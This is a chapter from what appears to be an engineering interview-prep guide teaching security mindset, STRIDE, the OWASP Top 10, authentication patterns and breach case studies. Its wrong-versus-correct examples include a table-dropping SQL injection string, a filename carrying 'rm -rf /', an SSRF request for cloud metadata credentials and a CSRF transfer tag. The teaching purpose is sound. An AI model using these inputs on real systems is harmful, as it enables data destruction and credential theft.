# Chapter 115: Security Mindset and Threat Modeling

> **Section 7: Engineering Excellence**
> *Security is not a feature you add at the end. It is a way of thinking about every design decision. The question is not "is this secure?" but "what is the worst thing an adversary could do with this?"*

---

```
╔══════════════════════════════════════════════════════════════════════╗
║              CHAPTER 115 — AT A GLANCE                              ║
╠══════════════════════════════════════════════════════════════════════╣
║  CORE THESIS: Security is a way of thinking, not a checklist.        ║
║  Every design decision has a security implication. Every API has      ║
║  a worst-case caller. Every secret has an expiry. Every permission    ║
║  has a minimum. Engineering with a security mindset means asking      ║
║  "what could go wrong if this were in the hands of an adversary?"     ║
║  before every decision, not after every incident.                    ║
╠══════════════════════════════════════════════════════════════════════╣
║  THE L6 SECURITY INSIGHT:                                            ║
║  L5 adds security as a review step. L6 designs systems where         ║
║  secure behavior is the path of least resistance — the default.      ║
║  The most secure systems are the ones where doing the wrong thing     ║
║  is harder than doing the right thing.                               ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## Overview

Security failures are almost always engineering failures: a developer trusted input they shouldn't have, an API exposed more than it needed to, a secret was stored somewhere it shouldn't have been. The most expensive security incidents are not sophisticated attacks — they're basic mistakes that a security-aware engineer would have caught at design time.

This chapter covers the core security thinking patterns that belong in every Staff engineer's toolkit: threat modeling with STRIDE, the OWASP Top 10 for backend engineers, authentication and authorization patterns (including their failure modes), secure coding defaults, and how security thinking applies in system design interviews.

---

## Part 1: Thinking Like an Attacker

**The adversarial mindset:** Security engineering requires a fundamentally different way of thinking than product engineering. Product engineering asks: "How do I make this work for the user?" Security engineering asks: "How could an adversary abuse this?"

This shift is uncomfortable for most engineers because it requires them to think about failure modes rather than success modes. But it is the most important skill in security: the ability to look at a system and ask not "does this work?" but "what is the worst thing a malicious actor could do with this?"

**Attack surface:** Every component of a system that can be reached from the outside is part of the attack surface. APIs, login forms, file upload endpoints, webhook receivers, admin panels, third-party integrations — any of these can be entry points. The larger the attack surface, the more work it takes to secure the system.

Reducing attack surface is one of the most effective security strategies:
- Disable features that aren't needed (default-off, not default-on)
- Expose the minimum API necessary (not a generic "admin API" that exposes everything)
- Require authentication before revealing anything about the system
- Close ports and services that aren't in use

**The "what if the caller is lying?" question:** Every API that accepts user input should be evaluated with this question. The caller claims to be an admin — can you verify it? The caller claims the payment amount is $10 — can you verify it? The caller claims the file they're uploading is a JPEG — can you verify it?

Every piece of input that the system trusts without verification is a potential attack vector. Trust nothing from the caller; verify everything.

**Threat modeling with STRIDE:** STRIDE is a mnemonic for the six categories of attacks. Every component in a system design can be evaluated against each:

| Category                  | Question                                                    | Example attack                                   |
|---------------------------|-------------------------------------------------------------|--------------------------------------------------|
| **Spoofing**              | Can an attacker pretend to be someone else?                | Forged JWT, session hijacking, IP spoofing        |
| **Tampering**             | Can an attacker modify data in transit or at rest?         | MITM attack, SQL injection, file tampering        |
| **Repudiation**           | Can users deny actions they performed?                     | Missing audit logs, unsigned API requests         |
| **Information Disclosure**| Can an attacker access data they shouldn't?                | IDOR, verbose error messages, path traversal      |
| **Denial of Service**     | Can an attacker prevent legitimate access?                 | Rate limit bypass, resource exhaustion, SYN flood |
| **Elevation of Privilege**| Can an attacker gain more permissions than they should?    | Privilege escalation, confused deputy attacks     |

**Applying STRIDE in practice:** For each component in a system design (a service, an API endpoint, a database, a message queue), ask: which of the six STRIDE categories applies? What is the specific attack? What is the mitigation?

Example (payment API):
- **Spoofing:** Can a caller forge a valid user ID? Mitigation: authenticate with a signed JWT; derive the user_id from the token, not from the request body.
- **Tampering:** Can a caller modify the payment amount? Mitigation: validate the amount server-side against the order record; never trust the amount from the client.
- **Repudiation:** Can a merchant deny processing a payment? Mitigation: signed request logs with timestamps and IP addresses.
- **Information Disclosure:** Can a caller enumerate card numbers? Mitigation: never return full card numbers; return only last 4 digits; log all card number requests.
- **DoS:** Can a caller exhaust the payment provider's rate limit? Mitigation: per-user rate limiting before reaching the payment provider.
- **Elevation:** Can a standard user trigger an admin refund action? Mitigation: check user role before every sensitive action, not just at login.

---

## Part 2: OWASP Top 10 for Backend Engineers

The OWASP Top 10 is a list of the most critical web application security risks. Every backend engineer should know these by heart, because they represent the most common ways real systems are compromised.

**1. Broken Access Control (most common)**

Access control failures — where users can access resources or actions they shouldn't — are the most frequently exploited vulnerability category. The canonical example is Insecure Direct Object Reference (IDOR):

```
# Vulnerable: user can access any user's data by changing the ID
GET /api/users/456/profile        ← user is authenticated as user 123
→ Returns user 456's profile (which they shouldn't be able to access)

# Correct: always verify ownership server-side
def get_profile(user_id_from_url, authenticated_user_id):
    if user_id_from_url != authenticated_user_id and not is_admin(authenticated_user_id):
        raise Forbidden("Access denied")
    return fetch_profile(user_id_from_url)
```

IDOR is common because developers forget that authenticated ≠ authorized. A user being logged in doesn't mean they can access all resources — only the resources they own or have been granted access to.

**2. Cryptographic Failures**

Weak or missing encryption protecting sensitive data:
- Storing passwords with MD5 or SHA-1 (use bcrypt, argon2, or scrypt)
- Transmitting data over HTTP (use HTTPS everywhere, HSTS)
- Using weak random number generation for tokens (`Math.random()` vs `crypto.getRandomValues()`)
- Hardcoding secrets in source code

```python
# Wrong: MD5 for passwords
password_hash = hashlib.md5(password.encode()).hexdigest()

# Correct: bcrypt with work factor
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

**3. Injection**

Injection attacks occur when untrusted data is sent to an interpreter as part of a command or query. SQL injection is the most famous, but the same pattern applies to:
- LDAP injection
- Command injection (`os.system("grep " + user_input)`)
- Template injection (server-side template injection)
- NoSQL injection (MongoDB queries that accept arbitrary operators)

```python
# SQL injection vulnerable
cursor.execute(f"SELECT * FROM users WHERE email = '{user_email}'")
# Attacker input: "'; DROP TABLE users; --"

# Parameterized query (correct)
cursor.execute("SELECT * FROM users WHERE email = %s", (user_email,))

# Command injection vulnerable
os.system(f"convert {filename} output.jpg")
# Attacker filename: "image.jpg; rm -rf /"

# Correct: use subprocess with explicit arguments (no shell=True)
subprocess.run(["convert", filename, "output.jpg"], check=True)
```

**4. Insecure Design**

Not all security bugs are coding errors — some are design errors. Insecure design means the threat model was never considered.

Example: A password reset flow that accepts "secret questions" with answers that are guessable from public social media profiles. The code is correct — it correctly validates the answer. But the design is insecure because the answers are not actually secret.

The mitigation for insecure design is threat modeling during the design phase, not code review after. This is why security thinking must be part of the design doc process, not a separate gate.

**5. Security Misconfiguration**

Default configurations are often insecure:
- Default admin credentials (admin/admin) left unchanged
- S3 buckets set to public when they should be private
- Verbose error messages that reveal stack traces and database schemas
- Directory listing enabled on web servers
- Unnecessary ports open to the internet

The fix: security hardening as part of the deployment process; automated checks (AWS Config, Prowler) to detect misconfigurations.

**6. Vulnerable and Outdated Components**

The Equifax breach (147M records, 2017) was caused by an unpatched Apache Struts vulnerability that had a CVE and a patch available for months. The fix: dependency scanning in CI/CD (OWASP Dependency-Check, Snyk, Dependabot); automated alerts when new CVEs affect your dependencies; defined process for applying critical patches quickly.

**7. Identification and Authentication Failures**

- Weak passwords allowed (no complexity requirements, no rate limiting on attempts)
- Credential stuffing: attackers use leaked credential lists to try username/password pairs
- Brute force: no account lockout after N failed attempts
- Session fixation: old session tokens not invalidated on password change or logout
- JWT algorithm confusion (see Part 3)

**8. Software and Data Integrity Failures**

- CI/CD pipelines that pull from unverified sources (dependency supply chain attacks)
- Deserialization of untrusted data (Java deserialization RCE attacks)
- Unsigned code / software updates

**9. Security Logging and Monitoring Failures**

You can't detect an attack you're not monitoring for. Minimum security logging:
- All authentication attempts (success and failure)
- All authorization failures (403s)
- All sensitive operations (password changes, privilege escalations, bulk exports)
- Rate limit breaches

**10. Server-Side Request Forgery (SSRF)**

SSRF occurs when an attacker causes the server to make HTTP requests to arbitrary URLs on behalf of the server (including internal services). Example:

```
# Application fetches a URL provided by the user
GET /fetch?url=https://trusted-site.com/image.jpg  ← intended use
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/credentials  ← SSRF attack
# This requests AWS EC2 instance metadata including IAM credentials
```

The Capital One breach (2019) used SSRF: the attacker triggered a SSRF via a misconfigured WAF, which then requested AWS metadata credentials, which were over-permissioned, allowing exfiltration of 100M+ records.

Mitigation: Validate URLs against an allowlist of trusted domains before fetching. Block private IP ranges (`10.x.x.x`, `172.16.x.x`, `192.168.x.x`, `169.254.x.x`).

---

## Part 3: Authentication and Authorization Patterns

**Authentication (AuthN): Who are you?**

| Method          | How it works                               | Best for                       | Key risk                        |
|-----------------|-------------------------------------------|--------------------------------|---------------------------------|
| API Key         | Long random string in header               | Service-to-service, public APIs| Key leakage (no expiry by default)|
| Session cookie  | Server stores session state                | Web apps (browser)             | CSRF if not handled properly    |
| JWT             | Self-contained signed token                | Stateless APIs, mobile         | Algorithm confusion, no revocation|
| OAuth 2.0       | Delegated access (third-party)             | SSO, third-party integrations  | Misconfigured redirect URIs     |
| mTLS            | Client presents certificate                | Service mesh, high-security    | Certificate lifecycle complexity|

**JWT pitfalls (critical to know):**

1. **Algorithm confusion (CVE-2015-9235):** JWT header specifies the signature algorithm. If the server trusts the header, an attacker can change `{"alg": "RS256"}` to `{"alg": "none"}` and forge tokens without a signature. Fix: always specify the expected algorithm in the verification code, never trust the header's `alg` field.

```python
# Vulnerable: trusts the algorithm from the token header
jwt.decode(token, public_key)

# Correct: specify expected algorithm explicitly
jwt.decode(token, public_key, algorithms=["RS256"])
```

2. **No expiry (`exp` claim missing):** A stolen JWT without an expiry is permanently valid. Always set `exp`. Standard: 15 minutes for access tokens; 7–30 days for refresh tokens.

3. **No revocation:** JWTs are stateless — once issued, they're valid until expiry. If a user logs out or changes their password, the old JWT is still valid until it expires. Solutions: short TTL + refresh tokens; token blocklist in Redis for immediate revocation.

4. **Sensitive data in payload:** JWT payload is base64-encoded, not encrypted. Anyone who intercepts the token can read the payload. Never put sensitive data (credit card numbers, SSNs, passwords) in JWT claims.

**Authorization (AuthZ): What can you do?**

**RBAC (Role-Based Access Control):** Users are assigned roles; roles have permissions; permissions grant access to resources. Simple and widely understood.

```
Roles: admin, editor, viewer
Permissions: users:read, users:write, users:delete, articles:publish
admin = all permissions
editor = articles:publish, articles:read
viewer = articles:read
```

RBAC works well for systems with a fixed set of resource types and a manageable number of roles. It breaks down when: there are many roles (role explosion), when access depends on resource attributes (can a user edit their own posts but not others?), or when there are complex cross-resource relationships.

**ABAC (Attribute-Based Access Control):** Access is determined by policies that evaluate attributes of the subject (user), resource, action, and environment. More expressive than RBAC but more complex to reason about.

```
Policy: "A user can edit an article if: 
  user.is_authenticated AND 
  (user.role == 'admin' OR user.id == article.author_id) AND 
  article.status != 'published'"
```

**The confused deputy problem:** A service has broad permissions granted to it by its role. A user calls the service with a request that uses those permissions on their behalf — but the user wouldn't normally be allowed to do that operation.

Example: A data export service has permission to read all S3 buckets. A user calls the export service with `bucket=admin-secrets`. The export service fetches the admin secrets and returns them to the user — because the service had permission, not because the user did.

Mitigation: Services should check what the *calling user* is allowed to do, not just what the *service* is allowed to do. Pass the user's identity through the service call chain and validate permissions at the resource level, not just at the service level.

**Principle of Least Privilege:** Every service, user, and role should have only the permissions needed for their function — no more.

In AWS terms: an application reading from one S3 bucket should have a policy that allows `s3:GetObject` on `arn:aws:s3:::my-bucket/*` and nothing else. Not `s3:*` on `*`.

---

## Part 4: Secure Defaults

**Fail closed, not open:** When an error occurs in an auth or access control check, deny access. Never allow access when the check fails.

```python
# Fail open (wrong): grants access on error
def can_user_access(user_id, resource_id):
    try:
        permission = check_permission(user_id, resource_id)
        return permission.granted
    except Exception:
        return True  # WRONG: grants access if permission check fails

# Fail closed (correct): denies access on error
def can_user_access(user_id, resource_id):
    try:
        permission = check_permission(user_id, resource_id)
        return permission.granted
    except Exception:
        logger.error("Permission check failed", extra={"user_id": user_id, "resource_id": resource_id})
        return False  # Correct: deny access on error
```

**Defense in depth:** No single security control should be the only barrier. Layers:
- TLS (transport security) — encrypts data in transit
- Authentication — verifies identity
- Authorization — verifies permission
- Input validation — prevents injection
- Rate limiting — prevents abuse
- Audit logging — detects attacks post-hoc

Each layer catches what others miss. An attacker who bypasses authentication still faces authorization. An attacker who bypasses authorization still faces audit logging and anomaly detection.

**Secure coding patterns:**

```python
# Secret management: never in code or environment variables visible in logs
# Wrong: secret in code
DB_PASSWORD = "mysecretpassword"

# Wrong: secret in env var that gets logged
logger.info(f"Connecting to DB with password: {os.environ['DB_PASSWORD']}")

# Correct: fetch from secret manager at startup; never log
from aws_secretsmanager import get_secret
DB_PASSWORD = get_secret("prod/myapp/db_password")

# Output encoding: prevent XSS
# Wrong: render user content directly
html = f"<div>{user_comment}</div>"

# Correct: escape output
from html import escape
html = f"<div>{escape(user_comment)}</div>"

# File path traversal prevention
# Wrong: user-controlled file path
filepath = f"/uploads/{user_provided_filename}"
open(filepath)

# Correct: sanitize and resolve to within allowed directory
import os
base_dir = "/uploads"
filepath = os.path.realpath(os.path.join(base_dir, user_provided_filename))
if not filepath.startswith(base_dir):
    raise ValueError("Path traversal detected")
```

**Secret rotation:** Every secret should have a rotation schedule and a rotation mechanism:
- Database passwords: rotate every 90 days; use IAM roles where possible (no password at all)
- API keys: expire unused keys automatically; alert on keys > 90 days old without rotation
- TLS certificates: automate renewal with Let's Encrypt or AWS ACM (never manually)
- Encryption keys: rotate per-key policy; use envelope encryption so key rotation doesn't require re-encrypting all data

---

## Part 5: Security in System Design Interviews

Security is not a separate section in a system design interview — it should be woven throughout.

**When to bring it up:** After you've established the basic architecture, proactively address security: "Let me think through the security implications of this design."

**What to cover:**

1. **Authentication:** How do users authenticate? API keys for service-to-service? JWT for mobile/web? OAuth2 for third-party integrations?

2. **Authorization:** Who can access what? Is this multi-tenant? (Critical: data isolation between tenants.) RBAC or ABAC?

3. **Data classification:** What categories of data does the system handle?
   - PII (Personally Identifiable Information): names, emails, SSNs, addresses → encrypt at rest + in transit; restrict access; audit logs
   - Financial data: card numbers, bank accounts → PCI DSS scope; tokenization; strict access controls
   - Credentials: passwords, API keys → never store plaintext; bcrypt for passwords; hash for API keys
   - Regular application data: no special handling beyond standard encryption

4. **Encryption:** TLS in transit (universal). Encryption at rest: database-level (AWS RDS encryption), field-level (sensitive fields individually encrypted), or application-level (encrypt before writing to DB, most flexible but most complex).

5. **Input validation and injection prevention:** parameterized queries for all DB operations; input validation at the API boundary; output encoding in templates.

6. **Rate limiting:** not just for performance — rate limiting is a security control. Without rate limiting, credential stuffing attacks, API key brute force, and scraping attacks are unconstrained.

7. **Audit logging:** every sensitive action should be logged with: who did it, what they did, when, from where. Payment charges, account deletions, admin actions, failed authentication attempts.

8. **Least privilege:** the services should only have the permissions they need. The search service should not have write access to the orders database.

**Signal to the interviewer:** Proactively mentioning security considerations — without prompting — signals Staff-level maturity. It shows that security is part of your design thinking, not a separate gate. It also covers a dimension many candidates miss, which differentiates your answer.

---

## Part 6: Real Incident Case Studies

**Equifax 2017 — Unpatched Library**

What happened: A critical vulnerability (CVE-2017-5638) was disclosed in Apache Struts in March 2017. A patch was available. Equifax's security team notified their IT department. The notification was not acted on. In May 2017, attackers exploited the vulnerability through a public-facing credit dispute portal, gaining access to Equifax's network. Over 78 days, attackers exfiltrated 147 million Americans' personal data (names, SSNs, birth dates, addresses, driver's license numbers).

Root cause: No automated process for applying security patches to production systems; no enforcement of patching SLAs for critical CVEs; no detection of the attacker's lateral movement (they moved through the network undetected for 78 days because network traffic monitoring was inadequate).

Lesson for engineers: Dependency scanning and patch management must be automated and enforced. A CVE with a known exploit that isn't patched within days for public-facing systems is an open door. Organizations need: (1) automated vulnerability scanning of all production dependencies; (2) defined SLA for critical CVEs (e.g., 7 days to patch); (3) network monitoring for lateral movement.

**Capital One 2019 — SSRF + Overprivileged IAM**

What happened: Capital One ran a firewall (WAF) in AWS. The WAF was misconfigured to forward requests to the instance metadata service. An attacker discovered this via SSRF — they sent a crafted request through the WAF that reached `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. The WAF returned the IAM role credentials. Those credentials were for a role with `s3:GetObject` on `arn:aws:s3:::*` — they could read any S3 bucket in the account. The attacker listed and downloaded 100+ million customer records.

Root cause: Two compounding failures: (1) SSRF vulnerability in the WAF configuration; (2) IAM role was massively over-permissioned (should only have access to specific buckets, not all buckets).

Lesson: Principle of least privilege in cloud IAM is not optional. The WAF's IAM role should have been allowed to access only the specific S3 bucket needed for WAF logs. Defense in depth: if one control fails (WAF SSRF), another should limit the blast radius (narrow IAM role). Block private IP ranges (including metadata IP `169.254.169.254`) in firewall rules before reaching applications.

**Uber 2016 — Credentials in GitHub**

What happened: Two Uber contractors were building a tool and stored AWS credentials in a private GitHub repository. GitHub was compromised (the repository was accessed by an unauthorized third party). The AWS credentials gave access to an S3 bucket containing Uber driver and rider data — 57 million records. Uber paid the attackers $100,000 under a bug bounty agreement (controversial). The breach was not disclosed to regulators for a year (Uber's Chief Security Officer was later convicted of obstruction of justice for this).

Root cause: Credentials stored in source code. This remains one of the most common causes of data breaches. AWS access key IDs and secret access keys, API keys, database connection strings — these appear in Git repositories regularly, often accidentally committed by developers.

Lesson: Never store credentials in code or Git repositories. Use IAM roles (for AWS resources), environment variables loaded from a secret manager (for local development), and automated scanning (git-secrets, truffleHog, GitHub's own secret scanning) to detect credentials in commits before they're pushed. Rotate any key that was exposed, even briefly.

---

## Part 7: L5 vs L6 Calibration

| Dimension                           | L5 / Senior SWE                                 | L6 / Staff SWE                                          |
|-------------------------------------|-------------------------------------------------|---------------------------------------------------------|
| **Threat modeling**                 | Performs threat modeling when asked             | Proactively threat models every significant design      |
| **OWASP knowledge**                 | Knows the major categories; can spot obvious bugs| Can identify non-obvious vulnerabilities; knows root causes |
| **Auth design**                     | Implements auth correctly with guidance          | Designs auth systems; identifies protocol pitfalls      |
| **Authorization**                   | Implements RBAC for a service                   | Designs authorization across services; avoids confused deputy|
| **Incident analysis**               | Can describe what happened in known incidents    | Can analyze novel incidents; draws systemic lessons     |
| **Secure design**                   | Adds security controls to an existing design     | Designs systems where security is the default, not an add-on|
| **Secret management**               | Avoids hardcoding secrets                        | Designs rotation strategies; enforces policy across org |
| **Interview presentation**          | Mentions security when asked                    | Proactively covers authentication, authorization, encryption, rate limiting|

---

## Part 8: Anti-Patterns in Security Design

**Anti-pattern 1: Security through obscurity**
"If we don't tell anyone our API endpoint, they won't find it." Attackers enumerate endpoints with automated scanners. Security through obscurity means you have no security when the "obscurity" is lost. Every API endpoint must be secured by authentication + authorization, regardless of whether it's publicly documented.

**Anti-pattern 2: Client-side authorization**
"The mobile app only shows the 'admin' button to admin users." The server API still accepts requests from non-admin users if it doesn't enforce server-side authorization. Client-side UI restrictions are UX, not security. All authorization checks must be on the server.

**Anti-pattern 3: Trusting user-supplied data for security decisions**
```
# Wrong: user controls their own user_id
POST /api/transfer
{ "from_user_id": 123, "to_user_id": 456, "amount": 100 }
# Attacker sets from_user_id to 999 (someone else's account)

# Correct: derive user identity from auth token, not request body
def transfer(authenticated_user_id, to_user_id, amount):
    # authenticated_user_id comes from the JWT, not the request body
    debit_account(authenticated_user_id, amount)
    credit_account(to_user_id, amount)
```

**Anti-pattern 4: Logging sensitive data**
Log files are often stored less securely than databases. They're forwarded to log aggregators, which may have broader access. Logging `password=abc123` or `card_number=4242...` creates a sensitive data trail in a low-security location. Never log credentials, card numbers, SSNs, full tokens, or full API keys. Mask or truncate: `card=****4242`, `token=eyJ....[truncated]`.

**Anti-pattern 5: Using MD5 or SHA-1 for passwords**
MD5 and SHA-1 are fast hash functions. Fast is bad for passwords — an attacker with a GPU can try billions of MD5 hashes per second. Use bcrypt, scrypt, or Argon2 — deliberately slow hash functions designed for passwords. bcrypt with cost factor 12 takes ~300ms — slow enough to make brute force impractical, fast enough for legitimate logins.

**Anti-pattern 6: Storing API keys in plaintext**
If your database is compromised, plaintext API keys are immediately usable. Hash API keys with SHA-256 before storing (no need for bcrypt — the key itself has enough entropy). On authentication, hash the provided key and compare to the stored hash. The original key is never stored.

---

## Part 9: Interview Application

**System design security checklist (for any interview):**

Say: "Let me think through the security properties of this design."

1. **Authentication:** "Users authenticate via [JWT/session/API key]. The token includes [user_id, role, exp]. It's signed with RS256 — the service only has the public key."

2. **Authorization:** "Every API endpoint checks that the authenticated user has permission to access the specific resource. For this multi-tenant system, every query includes `WHERE tenant_id = :tenant_id` from the auth token — not from the request."

3. **Sensitive data:** "This system handles [PII/payment data]. I'd encrypt it at rest using [AES-256 at the column level / database encryption / envelope encryption with KMS]. In transit, TLS 1.3 everywhere."

4. **Input validation:** "All external inputs are validated at the API boundary before processing. Parameterized queries for all DB operations — no string concatenation."

5. **Rate limiting:** "Authentication endpoints are rate-limited to 10 attempts per minute per IP. API calls are rate-limited to 1,000/minute per user token."

6. **Audit logging:** "All sensitive operations (payments, account changes, admin actions) are logged with timestamp, user_id, IP, and the action. Logs are append-only and stored in a separate system that application code can write to but not delete from."

7. **Secret management:** "No secrets in code. Database credentials come from AWS Secrets Manager; auto-rotated every 90 days. Application uses IAM roles — no static credentials."

This covers the main dimensions and takes about 2 minutes. It signals deep security awareness without making security the entire interview.

---

## Part 10: Exercises

**Exercise 1 (STRIDE):** Apply STRIDE threat modeling to a password reset flow:
```
User requests reset → System sends email with reset link → 
User clicks link → System validates token → User sets new password
```
For each of the 6 STRIDE categories: what is the specific attack, and what is the mitigation?

**Exercise 2 (Find the bugs):** Find the 5 security bugs in this fictional API design:
```
POST /api/v1/transfer
Header: X-User-ID: 123
Body: { "to_account": 456, "amount": 100, "currency": "USD" }

Handler:
  user_id = request.headers.get("X-User-ID")  # use directly
  if get_balance(user_id) >= amount:
    debit(user_id, amount)
    credit(to_account, amount)
    log(f"Transfer from {user_id}: $amount to {to_account}")
    return {"message": "Transfer complete", "new_balance": get_balance(user_id)}
```

Answers:
1. `X-User-ID` is not authenticated — any caller can set it to any value; use JWT instead
2. Race condition: check-then-act on balance (TOCTOU) — use atomic DB transaction
3. No rate limiting — allows brute force and automated fraud
4. Logging the amount as `$amount` (f-string bug using variable name) — but also logging PII (user_id and recipient)
5. Returning the new balance reveals financial information unnecessarily; return only success/failure

**Exercise 3 (Auth design):** Design the authentication and authorization system for a multi-tenant SaaS project management tool (like Asana). Requirements: users can belong to multiple organizations; some users are org admins; each project can have member-level and admin-level roles; all data must be strictly isolated by organization. Sketch: the data model, the JWT claims, and the authorization check at the API layer.

**Exercise 4 (SSRF):** Design a URL preview service that fetches metadata from user-provided URLs. What are the security concerns? How do you prevent SSRF? What URLs should be blocked? How do you handle malicious content in the fetched page?

---

## Homework

**Homework 1:** Apply STRIDE to a system you own or work on. Pick one service. For each of the 6 STRIDE categories, identify at least one specific attack and its mitigation. Write it up as a 1-page threat model.

**Homework 2:** Read the OWASP Top 10 documentation (owasp.org/Top10) — specifically the entries for Broken Access Control and Cryptographic Failures. Note one thing that surprised you.

**Homework 3:** Audit one service in your codebase for the following:
- Are all DB queries using parameterized queries?
- Are there any secrets hardcoded in the source code?
- Are authorization checks happening server-side (not just client-side)?
- Are any error responses revealing implementation details (stack traces, DB schemas)?
Report your findings and proposed fixes.

---

```
╔══════════════════════════════════════════════════════════════════════╗
║                KEY TAKEAWAYS — SECURITY MINDSET                     ║
╠══════════════════════════════════════════════════════════════════════╣
║  ADVERSARIAL MINDSET: Ask "what's the worst an attacker could do?"  ║
║  for every design decision. Assume every input is malicious.         ║
║                                                                      ║
║  STRIDE: Spoofing, Tampering, Repudiation, Info Disclosure,          ║
║  Denial of Service, Elevation of Privilege. Apply to every API.      ║
║                                                                      ║
║  OWASP TOP 3 (most common): Broken Access Control (IDOR),            ║
║  Cryptographic Failures (MD5 passwords, HTTP), Injection (SQLi).    ║
║                                                                      ║
║  JWT PITFALLS: Algorithm confusion (always specify `algorithms=`),   ║
║  no expiry (always set `exp`), no revocation (use short TTL).        ║
║                                                                      ║
║  LEAST PRIVILEGE: Services get only the permissions they need.       ║
║  IAM roles scoped to specific resources, not `*`.                    ║
║                                                                      ║
║  FAIL CLOSED: Access denied on error, never access granted.          ║
║  Defense in depth: auth + authz + rate limit + audit log + monitoring║
║                                                                      ║
║  IN INTERVIEWS: Proactively cover auth, authz, encryption, rate      ║
║  limiting, input validation, audit logging. Don't wait to be asked.  ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## Part 11: Additional Security Topics

**CORS (Cross-Origin Resource Sharing):** Browsers enforce same-origin policy by default — JavaScript on `evil.com` cannot read responses from `api.yourapp.com`. CORS headers allow specific origins to bypass this:
```
Access-Control-Allow-Origin: https://yourapp.com  # specific origin (safe)
Access-Control-Allow-Origin: *                    # any origin (dangerous for auth'd endpoints)
```
Never use `Access-Control-Allow-Origin: *` on endpoints that accept credentials (cookies, auth headers). This allows any website to make authenticated requests on behalf of your users.

**CSRF (Cross-Site Request Forgery):** An attacker's webpage silently makes a request to your API using the victim's session cookie. Example: `<img src="https://yourbank.com/transfer?to=attacker&amount=1000">` — if the bank's transfer endpoint uses only cookies for auth, this image tag triggers a money transfer.

Mitigations:
- SameSite=Lax or SameSite=Strict cookies (prevents cross-site cookie sending)
- CSRF tokens (random value in form + verified on server)
- Check `Origin` header on state-changing requests

**Content Security Policy (CSP):** HTTP header that tells browsers which sources of scripts, images, and other resources are allowed to load on a page. Mitigates XSS: even if an attacker injects a `<script>` tag, if the script's source isn't in the CSP allowlist, the browser refuses to execute it.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;
```

**Zero Trust Architecture:** The traditional security model is "trusted internal network + untrusted external network." Zero Trust abandons this: every request is authenticated and authorized, regardless of whether it comes from inside or outside the network. Every service authenticates to every other service (mTLS); no implicit trust based on network location.

This is increasingly the standard for large distributed systems where the "internal network" is no longer a meaningful security boundary.

---

## Part 12: One-Liners for Interview Recall

- **"Security is about defense in depth — no single control should be the only barrier."**
- **"Fail closed: deny on error, never grant on error."**
- **"Trust nothing from the caller; verify everything server-side."**
- **"IDOR is the most common API bug: authenticated ≠ authorized."**
- **"JWT algorithm confusion: always specify `algorithms=['RS256']`, never trust the header."**
- **"Least privilege: if a service doesn't need it, don't give it."**
- **"Never log credentials, card numbers, or full tokens — mask them."**
- **"bcrypt for passwords, SHA-256 for API keys — never MD5 or SHA-1."**
- **"SSRF: validate URLs against an allowlist; block metadata IP 169.254.169.254."**
- **"Client-side auth checks are UX, not security — server enforces."**
- **"Parameterized queries everywhere — no f-strings in SQL."**
- **"Secret rotation: credentials in code = eventual breach."**

---

## Part 13: Quick Reference — Auth Token Selection

| Situation                                  | Auth mechanism to use                      |
|--------------------------------------------|--------------------------------------------|
| Web app, browser-based                     | Session cookie (HttpOnly, Secure, SameSite)|
| Mobile app or SPA                          | JWT with short TTL + refresh token         |
| Service-to-service (same org)              | mTLS or JWT signed by internal CA          |
| Third-party integration (OAuth)            | OAuth 2.0 authorization code flow          |
| Public API (developers, customers)         | API key (hashed in DB, rotatable)          |
| Webhook sender verification                | HMAC signature on payload                  |
| Admin operations with high sensitivity     | MFA + short-lived JWT (15 min TTL)         |

---

## Part 14: Five-Level Progression — Security Mindset

**INTERN:** Aware that SQL injection exists. Avoids obvious mistakes (no hardcoded passwords in code). Uses HTTPS. Copies security patterns from existing code without understanding why.

**JUNIOR:** Knows the OWASP Top 10. Uses parameterized queries consistently. Doesn't store secrets in code. Asks "is this secure?" before releasing. Still thinks of security as a separate step.

**MID:** Applies security thinking during design, not just coding. Knows auth patterns (JWT, OAuth, session). Can spot IDOR and injection vulnerabilities in code review. Implements rate limiting. Knows the difference between authentication and authorization.

**SENIOR (L5):** Proactively threat models their service. Designs auth systems correctly (least privilege, short TTLs, proper revocation). Considers security implications when making architecture choices. Reviews adjacent code for security issues. Knows the major real-world incidents and what they teach.

**STAFF (L6):** Security thinking is integrated into every design decision. Designs systems where security is the default — the path of least resistance is the secure path. Identifies security antipatterns in org-wide code reviews. Defines security standards and patterns that the whole team follows. In interviews, covers authentication, authorization, encryption, rate limiting, audit logging, and threat model proactively and concisely.

---

## Part 15: Cryptography Essentials for Engineers

You don't need to implement cryptography — use well-tested libraries. But you need to know which algorithms to use and which to avoid.

**Symmetric encryption:**
- **AES-256-GCM:** The standard for symmetric encryption. Use for encrypting data at rest (field-level encryption, file encryption). GCM mode provides both confidentiality (encryption) and integrity (authentication tag — detects tampering). Always use a random 96-bit nonce; never reuse nonces with the same key.
- **Avoid:** AES-ECB mode (identical blocks produce identical ciphertext — patterns visible), DES/3DES (key size too small for modern attacks), RC4 (broken).

**Asymmetric encryption:**
- **RSA-OAEP:** Use for encrypting small data (symmetric keys, tokens). 2048-bit minimum; 4096-bit for long-term security.
- **Elliptic Curve Cryptography (ECC):** Smaller keys, same security. ECDH for key exchange; ECDSA for signatures. Use P-256 or P-384 curves.
- **Avoid:** RSA with PKCS#1 v1.5 padding (padding oracle attacks), RSA < 2048 bits.

**Hashing:**
- **SHA-256 / SHA-3:** For data integrity, HMAC, and API key storage. Fast and secure.
- **bcrypt / Argon2 / scrypt:** For passwords. Deliberately slow. bcrypt cost=12 recommended.
- **Avoid:** MD5, SHA-1 for any security purpose (both are broken for collision resistance). They're fine for non-security checksums (file integrity where the file isn't adversarially controlled) but never for passwords or digital signatures.

**Random number generation:**
- **Use:** `os.urandom()` (Python), `crypto.getRandomValues()` (JS), `SecureRandom` (Java). These use the OS's cryptographically secure random number generator.
- **Never use:** `Math.random()` (JavaScript), `random.random()` (Python) for security-sensitive values. These are not cryptographically secure.

**Envelope encryption (the standard for key management at scale):**
```
Problem: if you encrypt data with one master key, rotating that key means re-encrypting all data.

Solution: envelope encryption
  1. Generate a unique Data Encryption Key (DEK) per record/object
  2. Encrypt the data with the DEK
  3. Encrypt the DEK with a Key Encryption Key (KEK) stored in KMS
  4. Store: (encrypted_data, encrypted_DEK) together

